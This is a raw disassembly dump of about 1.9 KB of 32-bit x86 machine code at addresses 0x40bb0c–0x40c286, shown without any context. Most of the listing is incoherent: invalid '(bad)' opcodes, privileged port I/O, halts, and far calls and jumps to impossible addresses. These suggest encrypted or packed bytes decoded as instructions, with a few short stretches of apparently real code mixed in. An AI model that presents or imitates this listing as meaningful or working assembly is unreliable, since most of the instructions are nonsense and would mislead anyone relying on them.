  40bb0c:	lods   al,BYTE PTR ds:[esi]
  40bb0d:	and    eax,0xbfaf8c1
  40bb12:	pop    esi
  40bb13:	repz push esi
  40bb15:	jne    0x40bb8b
  40bb17:	loop   0x40bb55
  40bb19:	add    edi,esi
  40bb1b:	jmp    0x40baaa
  40bb1d:	adc    al,0x69
  40bb1f:	add    dh,BYTE PTR [ebp-0x3d]
  40bb22:	nop
  40bb23:	scas   al,BYTE PTR es:[edi]
  40bb24:	jo     0x40bb2d
  40bb26:	fwait
  40bb27:	mul    BYTE PTR [ebx-0x6bf76de1]
  40bb2d:	loop   0x40bb56
  40bb2f:	fs in  al,0xb1
  40bb32:	data16 jecxz 0x40bb81
  40bb35:	cwde   
  40bb36:	push   cs
  40bb37:	inc    eax
  40bb38:	fbld   TBYTE PTR [eax-0x1bb33ae1]
  40bb3e:	in     al,0xcf
  40bb40:	xor    al,0x99
  40bb42:	sub    dh,BYTE PTR [ecx]
  40bb44:	jmp    0xa7492049
  40bb49:	je     0x4a0972b1
  40bb4f:	and    ch,0x3e
  40bb52:	sub    edx,ebx
  40bb54:	mov    BYTE PTR [ebp+0x73],dh
  40bb57:	inc    ebp
  40bb58:	pop    ecx
  40bb59:	push   ebx
  40bb5a:	js     0x40bb31
  40bb5c:	pop    esp
  40bb5d:	jp     0x40bba9
  40bb5f:	stos   DWORD PTR es:[edi],eax
  40bb60:	dec    ebp
  40bb61:	jecxz  0x40bb7f
  40bb63:	mov    al,ds:0x322389af
  40bb68:	popa   
  40bb69:	sbb    BYTE PTR [ebp+0x2b],0xdb
  40bb6d:	pop    eax
  40bb6e:	clc    
  40bb6f:	outs   dx,BYTE PTR ds:[esi]
  40bb70:	mov    cl,0xdd
  40bb72:	fs cdq 
  40bb74:	jns    0x40bbbd
  40bb76:	loopne 0x40bb1f
  40bb78:	mov    ebp,0x930fa5ae
  40bb7d:	xchg   esi,eax
  40bb7e:	aad    0xc6
  40bb80:	adc    al,0x61
  40bb82:	or     esp,ebx
  40bb84:	clc    
  40bb85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb86:	sahf   
  40bb87:	(bad)  
  40bb89:	lods   al,BYTE PTR ds:[esi]
  40bb8a:	xor    DWORD PTR [eax+0x27e4f1d5],edi
  40bb90:	fdivr  DWORD PTR [eax+0x30]
  40bb93:	adc    dl,BYTE PTR [edx+0x66]
  40bb96:	jmp    0x2b471b4d
  40bb9b:	mov    esi,DWORD PTR cs:0x621c0b95
  40bba2:	mov    esi,0xaf626c72
  40bba7:	pusha  
  40bba8:	cld    
  40bba9:	add    edi,DWORD PTR [edi-0x2c3fb87a]
  40bbaf:	loope  0x40bc0e
  40bbb1:	inc    ebp
  40bbb2:	pop    ecx
  40bbb3:	or     al,0x8f
  40bbb5:	mov    WORD PTR ds:0xddb46a3a,cs
  40bbbb:	idiv   DWORD PTR [ecx-0x1a]
  40bbbe:	and    ecx,eax
  40bbc0:	test   eax,0x2e4fb752
  40bbc5:	imul   ecx,DWORD PTR [ecx+0x4eb16dc9],0x851d67ca
  40bbcf:	es shl dl,cl
  40bbd2:	sbb    al,0x97
  40bbd4:	repz cmp cl,ah
  40bbd7:	sbb    al,0x9b
  40bbd9:	(bad)
  40bbde:	cmp    edi,ebp
  40bbe0:	and    al,bh
  40bbe2:	jg     0x40bc09
  40bbe4:	add    edi,DWORD PTR [ebx+ebp*8+0x2e]
  40bbe8:	imul   ebp,ebp,0x39
  40bbeb:	pop    edi
  40bbec:	push   esp
  40bbed:	dec    ebx
  40bbee:	iret   
  40bbef:	and    DWORD PTR [eax+ecx*4],0xa
  40bbf3:	call   0xbb5b:0x5bd59f7d
  40bbfa:	xor    al,BYTE PTR [esi-0x44]
  40bbfd:	(bad)  
  40bbfe:	sahf   
  40bbff:	nop
  40bc00:	inc    esp
  40bc01:	shl    ch,1
  40bc03:	cs push 0xf5c40633
  40bc09:	mov    WORD PTR [ecx],ss
  40bc0b:	push   cs
  40bc0c:	(bad)
  40bc0f:	scas   al,BYTE PTR es:[edi]
  40bc10:	out    dx,al
  40bc11:	push   edx
  40bc12:	pop    edi
  40bc13:	xor    eax,0xb62be918
  40bc18:	dec    esi
  40bc19:	fcomp  st(1)
  40bc1b:	out    dx,eax
  40bc1c:	and    edi,DWORD PTR es:[edx-0x55ffa40c]
  40bc23:	cmp    al,0xa1
  40bc25:	add    eax,0x8290fb76
  40bc2a:	daa    
  40bc2b:	mov    eax,0xb8322efc
  40bc30:	xor    ah,BYTE PTR [ecx+ebp*8+0x6f0f8a99]
  40bc37:	pushf  
  40bc38:	fs shl eax,0x50
  40bc3c:	shl    DWORD PTR [edx+0x26c96481],0x67
  40bc43:	test   DWORD PTR [eax],edx
  40bc45:	jecxz  0x40bc0b
  40bc47:	xchg   ebp,eax
  40bc48:	mov    esi,0x49c54712
  40bc4d:	sub    eax,0x82f017e3
  40bc52:	jg     0x40bc0f
  40bc54:	xor    BYTE PTR [ebx],dh
  40bc56:	bound  esi,QWORD PTR [ecx-0x5cd99ac7]
  40bc5c:	int    0x88
  40bc5e:	cmp    BYTE PTR [edi],cl
  40bc60:	mov    bh,0x4
  40bc62:	js     0x40bbef
  40bc64:	dec    ebp
  40bc65:	in     al,dx
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	imul   DWORD PTR [edi+0x23]
  40bc98:	repz (bad) 
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	jecxz  0x40bd1a
  40bca3:	push   ecx
  40bca4:	ror    DWORD PTR [edi+0x53],0x60
  40bca8:	out    0xca,al
  40bcaa:	dec    eax
  40bcab:	mov    ds:0xd26112a5,al
  40bcb0:	ja     0x40bcf1
  40bcb2:	enter  0xfde,0xc7
  40bcb6:	sbb    al,0x69
  40bcb8:	inc    esp
  40bcb9:	mov    esp,0xae9eae3
  40bcbe:	jl     0x40bc5e
  40bcc0:	inc    esi
  40bcc1:	inc    ecx
  40bcc2:	jmp    0x40bca9
  40bcc4:	lea    eax,[edx]
  40bcc6:	cmp    esi,DWORD PTR [ebx]
  40bcc8:	push   eax
  40bcc9:	mov    eax,0xe322959c
  40bcce:	inc    esi
  40bccf:	push   eax
  40bcd0:	imul   edx,ebx,0x1f0a269
  40bcd6:	enter  0x220f,0xb0
  40bcda:	aas    
  40bcdb:	dec    eax
  40bcdc:	push   0x57
  40bcde:	test   ebx,0xb6563e3b
  40bce4:	lahf   
  40bce5:	pop    ds
  40bce6:	frstor [eax+0x4c]
  40bce9:	cmc    
  40bcea:	rcl    ecx,0x2f
  40bced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcee:	and    DWORD PTR [eax+0x72d21853],edi
  40bcf4:	add    DWORD PTR [edi],esp
  40bcf6:	out    0x4e,eax
  40bcf8:	and    eax,0x68b4be65
  40bcfd:	cmp    BYTE PTR [esi+0x5b],al
  40bd00:	sbb    bl,BYTE PTR [esi]
  40bd02:	(bad)  
  40bd03:	and    eax,0xcdbcc5d0
  40bd08:	ret    
  40bd09:	rcl    DWORD PTR [edi-0x4e71166b],0x82
  40bd10:	mov    ds:0x5da6aace,eax
  40bd15:	inc    edi
  40bd16:	push   eax
  40bd17:	and    al,0x1c
  40bd1a:	dec    ebx
  40bd1b:	jnp    0x40bcbb
  40bd1d:	shr    esi,0xbd
  40bd20:	popa   
  40bd21:	and    al,0x38
  40bd23:	fcmove st,st(6)
  40bd25:	(bad)  
  40bd26:	mov    ds:0xdb660858,al
  40bd2b:	inc    edi
  40bd2c:	sub    eax,DWORD PTR [esp+ebp*4-0x14e2860f]
  40bd33:	jnp    0x40bd3d
  40bd35:	clc    
  40bd36:	jmp    0x40bda3
  40bd38:	ja     0x40bd55
  40bd3a:	cmp    ecx,DWORD PTR [edi+0x14]
  40bd3d:	mov    esi,0x71a0f4c2
  40bd42:	xchg   ecx,eax
  40bd43:	shr    BYTE PTR [edi-0x1b],1
  40bd46:	loop   0x40bd44
  40bd48:	ror    BYTE PTR [esi],0xd8
  40bd4b:	jmp    0x88dc:0x5471085a
  40bd52:	mov    dl,0x56
  40bd54:	hlt    
  40bd55:	xor    al,0x4b
  40bd57:	sahf   
  40bd58:	cmp    al,0x2e
  40bd5a:	es stos DWORD PTR es:[edi],eax
  40bd5c:	jmp    0x851e1725
  40bd61:	xor    eax,0x336a0e49
  40bd66:	mov    BYTE PTR [ebp-0x729ea98f],ch
  40bd6c:	test   DWORD PTR [ebp+0x4a0f7a24],0xf5295fdd
  40bd76:	call   0xe7cb:0xe7a20944
  40bd7d:	push   edi
  40bd7e:	fwait
  40bd7f:	imul   eax,DWORD PTR [eax],0x51
  40bd82:	jne    0x40bd6b
  40bd84:	jnp    0x40bd70
  40bd86:	repz mov bl,0x11
  40bd89:	and    edx,edx
  40bd8b:	stos   BYTE PTR es:[edi],al
  40bd8c:	stos   DWORD PTR es:[edi],eax
  40bd8d:	xchg   esp,eax
  40bd8e:	cmp    BYTE PTR [eax-0x64e6f9b3],cl
  40bd94:	adc    al,0x3a
  40bd96:	push   esp
  40bd97:	xor    BYTE PTR [ecx],dh
  40bd99:	iret   
  40bd9a:	sub    ebp,ebp
  40bd9c:	int3   
  40bd9d:	xchg   ecx,eax
  40bd9e:	bswap  edx
  40bda0:	cld    
  40bda1:	lahf   
  40bda2:	xchg   esi,eax
  40bda3:	xchg   edi,eax
  40bda4:	xor    eax,0xe74923ab
  40bda9:	mov    dh,0xe6
  40bdab:	int    0x55
  40bdad:	push   ecx
  40bdae:	cmp    al,0xd7
  40bdb0:	cmp    BYTE PTR [esi*4-0x6ca159f5],bh
  40bdb7:	xchg   esp,eax
  40bdb8:	xlat   BYTE PTR ds:[ebx]
  40bdb9:	(bad)  
  40bdba:	xor    DWORD PTR [eax-0x1a],esp
  40bdbd:	pop    edi
  40bdbe:	fwait
  40bdbf:	xchg   esp,eax
  40bdc0:	mov    bl,0x93
  40bdc2:	jo     0x40bdd6
  40bdc4:	pop    es
  40bdc5:	ds push edi
  40bdc7:	dec    ebx
  40bdc8:	lods   eax,DWORD PTR ds:[esi]
  40bdc9:	sbb    BYTE PTR [edi],bl
  40bdcb:	inc    edx
  40bdcc:	pop    ebx
  40bdcd:	daa    
  40bdce:	push   ds
  40bdcf:	adc    al,0x1c
  40bdd1:	rcr    DWORD PTR [ebp-0x41b00f5],0xb
  40bdd8:	and    dh,dl
  40bdda:	or     eax,0x1b3647b3
  40bddf:	jecxz  0x40be45
  40bde1:	xchg   esp,eax
  40bde2:	dec    ecx
  40bde3:	push   edi
  40bde4:	(bad)  
  40bde5:	mov    al,0x59
  40bde7:	shr    ecx,cl
  40bde9:	pop    esi
  40bdea:	pop    ecx
  40bdeb:	clc    
  40bdec:	addr16 out 0x9f,al
  40bdef:	xchg   BYTE PTR [esi-0x199c1a77],bl
  40bdf5:	cwde   
  40bdf6:	sbb    DWORD PTR [ebx+0x5a],edx
  40bdf9:	mov    cs,WORD PTR [edx+0x76dbd1fc]
  40bdff:	pop    ebx
  40be00:	sbb    DWORD PTR [eax],edi
  40be02:	sub    edx,DWORD PTR [edi+0x56db009e]
  40be08:	push   edx
  40be09:	(bad)  
  40be0a:	mov    bh,0xc2
  40be0c:	mov    BYTE PTR [edx+eiz*8+0x5d],dh
  40be10:	sar    BYTE PTR ds:0xe9de1380,1
  40be16:	int    0xcb
  40be18:	mov    al,0x56
  40be1a:	mov    al,0xce
  40be1c:	sbb    eax,0x7ed99c05
  40be21:	cli    
  40be22:	outs   dx,DWORD PTR ds:[esi]
  40be23:	add    al,0xad
  40be25:	xor    BYTE PTR [eax+0x5c],bh
  40be28:	mov    ah,0xae
  40be2a:	jbe    0x40be80
  40be2c:	or     al,0xde
  40be2e:	jno    0x40be9a
  40be30:	jl     0x40be8b
  40be32:	jmp    0x40be9c
  40be34:	inc    esp
  40be35:	fnstsw WORD PTR [edx-0x1024dcc4]
  40be3b:	sub    BYTE PTR [ebx+0x22b2cffa],0xf1
  40be42:	ds jg  0x40bdc8
  40be45:	stos   BYTE PTR es:[edi],al
  40be46:	test   DWORD PTR [esi+edx*1+0x4598bf44],0xa1cfad9f
  40be51:	out    dx,eax
  40be52:	(bad)  
  40be53:	(bad)  
  40be54:	push   ds
  40be55:	ss into 
  40be57:	outs   dx,DWORD PTR ds:[esi]
  40be58:	call   FWORD PTR [ebp+0x1e4fb967]
  40be5e:	jp     0x40bedf
  40be60:	cmp    ah,bh
  40be62:	outs   dx,DWORD PTR ds:[esi]
  40be63:	ins    DWORD PTR es:[edi],dx
  40be64:	jae    0x40bdf5
  40be66:	or     al,0x66
  40be68:	je     0x40bea7
  40be6a:	push   ebp
  40be6b:	pop    ecx
  40be6c:	push   esi
  40be6d:	mov    ds:0x92468655,eax
  40be72:	ins    DWORD PTR es:[edi],dx
  40be73:	push   ds
  40be74:	mov    bh,0x72
  40be76:	mov    al,0x8
  40be78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be79:	outs   dx,BYTE PTR ds:[esi]
  40be7a:	lods   al,BYTE PTR ds:[esi]
  40be7b:	and    BYTE PTR [edi-0x4e],ch
  40be7e:	push   esp
  40be7f:	mov    ch,0xd
  40be81:	outs   dx,DWORD PTR ds:[esi]
  40be82:	adc    bl,BYTE PTR [edi-0x8]
  40be85:	call   0xa0b4b19
  40be8a:	fcom   st(5)
  40be8c:	xor    edx,edi
  40be8e:	or     eax,0x6fe1dea3
  40be93:	pusha  
  40be94:	fisub  WORD PTR ds:0xa51d847c
  40be9a:	mov    ebp,0x38cefd50
  40be9f:	out    dx,eax
  40bea0:	xlat   BYTE PTR ds:[ebx]
  40bea1:	push   0x74
  40bea3:	pop    esi
  40bea4:	adc    ecx,DWORD PTR [ebx]
  40bea6:	xchg   ebx,eax
  40bea7:	xchg   BYTE PTR [ebp-0x4bef8541],al
  40bead:	pop    edx
  40beae:	(bad)  
  40beaf:	cli    
  40beb0:	jge    0x40becb
  40beb2:	jnp    0x40bf2e
  40beb4:	les    ecx,FWORD PTR [esi]
  40beb6:	fidiv  WORD PTR [ebp-0x9118b3b]
  40bebc:	lahf   
  40bebd:	sbb    al,0x1e
  40bebf:	shr    DWORD PTR [edx],0x4b
  40bec2:	xchg   ebp,eax
  40bec3:	lea    esp,ds:0x10c2cda8
  40bec9:	shl    dl,0x5b
  40becc:	test   eax,0xa4f99ac1
  40bed1:	sbb    esp,0xe68dc38f
  40bed7:	sar    DWORD PTR [ebp+0x2de88bc2],cl
  40bedd:	pop    edx
  40bede:	fwait
  40bedf:	movzx  esp,WORD PTR cs:[esi]
  40bee3:	jae    0x40bf49
  40bee5:	in     eax,dx
  40bee6:	call   0xe907:0x51085435
  40beed:	add    ebx,edi
  40beef:	(bad)  
  40bef0:	dec    DWORD PTR [ebx+0x45030c45]
  40bef6:	or     BYTE PTR [ecx+0x458bf045],cl
  40befc:	in     al,0x85
  40befe:	ror    BYTE PTR [edi],0x84
  40bf01:	mov    ecx,0x8900000c
  40bf06:	jne    0x40bee4
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi-0x4d5fb9cf]
  40bf27:	nop
  40bf28:	cmp    cl,0x7e
  40bf2b:	jle    0x40bf65
  40bf2d:	jl     0x40bfad
  40bf2f:	jle    0x40bf8d
  40bf31:	dec    esi
  40bf32:	jmp    0x52455d6
  40bf37:	push   eax
  40bf38:	aad    0x10
  40bf3a:	ins    DWORD PTR es:[edi],dx
  40bf3b:	mov    esi,0x7cea5ae2
  40bf40:	mov    bh,0x87
  40bf42:	dec    esi
  40bf43:	retf   
  40bf44:	loope  0x40bf2a
  40bf46:	adc    ah,BYTE PTR [ecx+0x5d]
  40bf49:	jns    0x40bf26
  40bf4b:	jmp    0x8520:0x876dcb02
  40bf52:	pop    ebx
  40bf53:	iret   
  40bf54:	mov    bh,0xf
  40bf56:	repz cmp edi,DWORD PTR [ecx+0x21a4f81]
  40bf5d:	ficomp WORD PTR [edi-0x2f16f3ab]
  40bf63:	dec    esi
  40bf64:	js     0x40bf4b
  40bf66:	fsubr  QWORD PTR [edi]
  40bf68:	and    bl,BYTE PTR [esi+0x73633722]
  40bf6e:	iret   
  40bf6f:	xor    BYTE PTR [ebx+0x233a5126],bl
  40bf75:	jbe    0x40bf51
  40bf77:	dec    ebx
  40bf78:	test   eax,0xefa49110
  40bf7d:	jle    0x40bf2a
  40bf7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf80:	loopne 0x40bf79
  40bf82:	sub    al,0x94
  40bf84:	sub    eax,0x2c790734
  40bf89:	mov    eax,ds:0xd5c3d0eb
  40bf8e:	scas   eax,DWORD PTR es:[edi]
  40bf8f:	test   DWORD PTR [esi-0x23413843],ebx
  40bf95:	sahf   
  40bf96:	loopne 0x40bf3d
  40bf98:	jge    0x40bf28
  40bf9a:	xor    eax,edx
  40bf9c:	sbb    BYTE PTR [ecx],ch
  40bf9e:	xlat   BYTE PTR ds:[ebx]
  40bf9f:	out    dx,al
  40bfa0:	jp     0x40bf5e
  40bfa2:	adc    dl,ch
  40bfa4:	(bad)  
  40bfa6:	loope  0x40bff1
  40bfa8:	pop    ebx
  40bfa9:	repnz mov ebx,0x135bd33a
  40bfaf:	int3   
  40bfb0:	js     0x40bfcc
  40bfb2:	push   ds
  40bfb3:	(bad)  
  40bfb4:	adc    DWORD PTR [di],eax
  40bfb7:	push   ecx
  40bfb8:	cld    
  40bfb9:	stc    
  40bfba:	cmp    BYTE PTR [esi],al
  40bfbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfbd:	push   es
  40bfbe:	xchg   esp,eax
  40bfbf:	shr    ebx,0x15
  40bfc2:	test   al,0x1f
  40bfc4:	loop   0x40bfec
  40bfc6:	push   ss
  40bfc7:	push   edi
  40bfc8:	push   cs
  40bfc9:	pop    eax
  40bfca:	js     0x40c016
  40bfcc:	in     al,dx
  40bfcd:	inc    edx
  40bfce:	pop    ebx
  40bfcf:	add    DWORD PTR [edx],0xc
  40bfd2:	lods   al,BYTE PTR ds:[esi]
  40bfd3:	mov    ecx,0x13b4cfd3
  40bfd8:	adc    eax,0xae4d351b
  40bfdd:	test   DWORD PTR [eax],esp
  40bfdf:	inc    ecx
  40bfe0:	push   ecx
  40bfe1:	mov    es,WORD PTR [ecx]
  40bfe3:	xchg   esi,eax
  40bfe4:	adc    eax,0xe6c828b2
  40bfe9:	cmp    eax,0x7703a72a
  40bfee:	xlat   BYTE PTR ds:[ebx]
  40bfef:	call   0xd86b496
  40bff4:	mov    DWORD PTR [eax],edi
  40bff6:	arpl   WORD PTR [edx-0x3f],ax
  40bff9:	pop    ebp
  40bffa:	fisub  DWORD PTR [eax-0x5]
  40bffd:	xchg   ebp,eax
  40bffe:	pop    ebx
  40bfff:	js     0x40c060
  40c001:	stos   DWORD PTR es:[edi],eax
  40c002:	ret    0x3809
  40c005:	cmc    
  40c006:	push   ebx
  40c007:	sub    bl,al
  40c009:	dec    eax
  40c00a:	mov    dl,dh
  40c00c:	sbb    esp,eax
  40c00e:	mov    bl,0x76
  40c010:	push   ss
  40c011:	aaa    
  40c012:	jbe    0x40c07f
  40c014:	and    ch,BYTE PTR [ebp+0x28511a67]
  40c01a:	lock and ecx,ecx
  40c01d:	lahf   
  40c01e:	sti    
  40c01f:	dec    ecx
  40c020:	icebp  
  40c021:	xor    ebx,DWORD PTR [esi]
  40c023:	fwait
  40c024:	ss mov bl,0xa6
  40c027:	mov    fs,edi
  40c029:	jnp    0x40c02e
  40c02b:	sub    ebx,DWORD PTR [edx]
  40c02d:	and    eax,0xc8326c3b
  40c032:	mov    edi,0x2fe6bd9e
  40c037:	sbb    esp,DWORD PTR [ecx-0x410d753c]
  40c03d:	shr    DWORD PTR [edi+0xb9ab2c],0x6
  40c044:	add    al,BYTE PTR [ecx+0x72396998]
  40c04a:	mov    ch,0xf8
  40c04c:	xchg   ebp,eax
  40c04d:	inc    eax
  40c04e:	jno    0x40c01c
  40c050:	mov    eax,ds:0xb05a8fd3
  40c056:	leave  
  40c057:	add    eax,0x160053de
  40c05c:	adc    eax,DWORD PTR [edi-0x54d7dfd8]
  40c062:	xchg   ebx,eax
  40c063:	retf   0x9ccf
  40c066:	imul   ebp,DWORD PTR [edi],0x7a
  40c069:	mov    ecx,0xe4184dba
  40c06e:	rcl    BYTE PTR [ebp-0x1],0xa7
  40c072:	push   ds
  40c073:	push   eax
  40c074:	inc    edx
  40c075:	adc    BYTE PTR [edx],bl
  40c077:	dec    edx
  40c078:	std    
  40c079:	adc    edi,0xffffff93
  40c07c:	lds    eax,FWORD PTR [edi+0xfe4d7f]
  40c082:	xchg   ebx,eax
  40c083:	push   esi
  40c084:	cmc    
  40c085:	aaa    
  40c086:	pop    ebp
  40c087:	call   0xbc8:0xc04ad5cb
  40c08e:	(bad)  
  40c08f:	fst    QWORD PTR [eax+0x41]
  40c092:	sub    eax,0xd476b7e2
  40c097:	test   DWORD PTR [edx],0xb61c3ec9
  40c09d:	mov    cl,cl
  40c09f:	push   ebp
  40c0a0:	call   DWORD PTR [ebp+0x18561d11]
  40c0a6:	dec    eax
  40c0a7:	sbb    eax,edi
  40c0a9:	enter  0xfaa6,0x60
  40c0ad:	pushf  
  40c0ae:	sbb    cl,dl
  40c0b0:	ins    DWORD PTR es:[edi],dx
  40c0b1:	imul   edx,DWORD PTR [edi-0x29],0xffffff99
  40c0b5:	adc    ah,al
  40c0b7:	fistp  WORD PTR [eax+0x18]
  40c0ba:	mov    ebx,ebx
  40c0bc:	stc    
  40c0bd:	push   edx
  40c0be:	jmp    0x1b5b15a1
  40c0c3:	imul   edx,DWORD PTR [eax+edx*8-0x36],0xffffffd4
  40c0c8:	sbb    al,0x63
  40c0ca:	nop
  40c0cb:	jp     0x40c089
  40c0cd:	sbb    ah,BYTE PTR [ebp-0x63]
  40c0d0:	sbb    ebp,DWORD PTR [ebp-0x3]
  40c0d3:	mov    dh,0x3
  40c0d5:	loop   0x40c155
  40c0d7:	or     eax,0x8a400613
  40c0dc:	(bad)  
  40c0dd:	cmp    esi,DWORD PTR [edi+eax*4+0x65a95883]
  40c0e4:	std    
  40c0e5:	push   0x17
  40c0e7:	hlt    
  40c0e8:	mov    ebp,0xfd124033
  40c0ed:	out    0x16,eax
  40c0ef:	clc    
  40c0f0:	add    eax,DWORD PTR ds:0x3a80a88
  40c0f6:	aas    
  40c0f7:	in     al,0x94
  40c0f9:	inc    edi
  40c0fa:	jb     0x40c178
  40c0fc:	push   eax
  40c0fd:	dec    ecx
  40c0fe:	ins    DWORD PTR es:[edi],dx
  40c0ff:	and    DWORD PTR [ebx-0x6a],esp
  40c102:	push   ss
  40c103:	fisub  WORD PTR [edi+0x55]
  40c106:	push   ecx
  40c107:	lods   eax,DWORD PTR ds:[esi]
  40c108:	call   0x9cbad48e
  40c10d:	sub    dh,BYTE PTR [ecx-0x15]
  40c110:	test   eax,0x4b061c0b
  40c115:	div    DWORD PTR [esi+0x2e]
  40c118:	and    eax,0x3db8fb22
  40c11d:	mov    cl,0x93
  40c11f:	and    dh,BYTE PTR [ebp+esi*4-0x4ad49887]
  40c126:	test   eax,0x4185f1c2
  40c12b:	int3   
  40c12c:	xchg   ebp,eax
  40c12d:	add    al,0xb5
  40c12f:	imul   edx,DWORD PTR [edx+0x78251da6],0x1
  40c136:	fs sbb al,0x4d
  40c139:	pusha  
  40c13a:	ja     0x40c0df
  40c13c:	add    eax,0xf8e72ee3
  40c141:	jmp    0xf4fbdc4c
  40c146:	pop    edx
  40c147:	sbb    DWORD PTR [eax-0x17],ebp
  40c14a:	mov    ecx,0xaffdc77b
  40c14f:	bound  esi,QWORD PTR [edx+0x5e]
  40c152:	inc    esi
  40c153:	clc    
  40c154:	dec    esi
  40c155:	mov    bh,0x93
  40c157:	test   al,0xcc
  40c159:	mov    esp,edx
  40c15b:	adc    al,0x8c
  40c15d:	(bad)  
  40c15e:	cmc    
  40c15f:	mov    cl,0xb5
  40c161:	mov    ebp,0x64e100ac
  40c166:	adc    DWORD PTR [ebx+0xd],edx
  40c169:	cld    
  40c16a:	mov    BYTE PTR [edi+0x8dcff40],ah
  40c170:	push   0xffffff90
  40c172:	push   0x8763924e
  40c177:	retf   
  40c178:	dec    ecx
  40c179:	mov    eax,DWORD PTR [ebp-0x1c]
  40c17c:	imul   eax,ecx
  40c17f:	sub    esp,eax
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0x98
  40c196:	jp     0x40c130
  40c198:	test   BYTE PTR [edx-0x79],0x7e
  40c19c:	jle    0x40c1d6
  40c19e:	jl     0x40c21e
  40c1a0:	jle    0x40c17a
  40c1a2:	sub    ebx,0x1d
  40c1a5:	inc    bx
  40c1a7:	jg     0x40c143
  40c1a9:	shl    BYTE PTR [ecx-0x7c],1
  40c1ac:	dec    edi
  40c1ad:	addr16 or eax,0x19892b48
  40c1b3:	sbb    ah,bh
  40c1b5:	arpl   WORD PTR [ebx],bx
  40c1b7:	xor    al,0x76
  40c1b9:	mov    ch,0x4d
  40c1bb:	mov    bh,0xd5
  40c1bd:	and    BYTE PTR [eax+edi*8+0x2129acc0],0xf6
  40c1c5:	xor    dl,dh
  40c1c7:	or     DWORD PTR [eax+0x51],esi
  40c1ca:	xor    DWORD PTR [esi+0x6c],esp
  40c1cd:	dec    esp
  40c1ce:	inc    ebp
  40c1cf:	repnz mov ds:0x2926a82,eax
  40c1d5:	aam    0x9e
  40c1d7:	sbb    DWORD PTR [edi-0x66cb6224],edi
  40c1dd:	cli    
  40c1de:	data16 jns 0x40c23c
  40c1e1:	xor    eax,0x2c64a534
  40c1e6:	push   esi
  40c1e7:	test   al,0xbf
  40c1e9:	dec    ecx
  40c1ea:	int    0xd6
  40c1ec:	outs   dx,BYTE PTR ds:[esi]
  40c1ed:	daa    
  40c1ee:	sub    al,0x70
  40c1f0:	lods   eax,DWORD PTR ds:[esi]
  40c1f1:	jb     0x40c1c9
  40c1f3:	pop    ebx
  40c1f4:	mov    ah,0x2
  40c1f6:	popf   
  40c1f7:	pop    edi
  40c1f8:	sub    eax,0xfdef46a0
  40c1fd:	ins    BYTE PTR es:[edi],dx
  40c1fe:	adc    DWORD PTR [edi],eax
  40c200:	pop    edx
  40c201:	add    eax,0xc3d88f63
  40c206:	mov    esi,DWORD PTR ds:0x4f82c8ef
  40c20c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c20d:	sub    esi,ebp
  40c20f:	ror    BYTE PTR [esi+0x56],0x43
  40c213:	xchg   edi,eax
  40c214:	xchg   edx,eax
  40c215:	psraw  mm1,0x20
  40c219:	xor    ecx,esi
  40c21b:	dec    esi
  40c21c:	int    0xe1
  40c21e:	dec    edx
  40c21f:	out    dx,al
  40c220:	sbb    al,0x8c
  40c222:	shl    eax,1
  40c224:	ret    
  40c225:	dec    eax
  40c226:	adc    eax,0x3537c7ac
  40c22b:	mov    ecx,0xbb143dd5
  40c230:	adc    BYTE PTR [edx-0x38],dl
  40c233:	jb     0x40c219
  40c235:	xchg   DWORD PTR [eax-0x73],edx
  40c238:	out    dx,eax
  40c239:	je     0x40c245
  40c23b:	dec    esp
  40c23c:	or     eax,0x4cc2a8c
  40c241:	dec    edi
  40c242:	sbb    al,0x8f
  40c244:	lahf   
  40c245:	pop    esi
  40c246:	gs dec esi
  40c248:	pop    ecx
  40c249:	arpl   cx,bx
  40c24b:	push   esi
  40c24c:	in     eax,0x59
  40c24e:	out    dx,al
  40c24f:	jecxz  0x40c2b4
  40c251:	inc    esi
  40c252:	mov    BYTE PTR [edx+0x61],dh
  40c255:	jns    0x40c24f
  40c257:	movq   mm7,QWORD PTR [esi+0x7b]
  40c25b:	cmp    bh,BYTE PTR [ebx+0x26facb32]
  40c261:	shr    al,0x26
  40c264:	daa    
  40c265:	xlat   BYTE PTR ds:[ebx]
  40c266:	dec    ebx
  40c267:	es mov ch,0xad
  40c26a:	mov    ebp,0xc7897bbb
  40c26f:	inc    edx
  40c270:	xchg   ebx,eax
  40c271:	addr16 sti 
  40c273:	inc    ecx
  40c274:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c275:	cli    
  40c276:	imul   ebp,DWORD PTR cs:[ebp+0x3a],0x43
  40c27b:	iret   
  40c27c:	adc    DWORD PTR [ebp+0x23],edx
  40c27f:	or     bh,cl
  40c281:	mov    esi,0x79b84a2f
  40c286:	mov    ds:0x286ae984,al
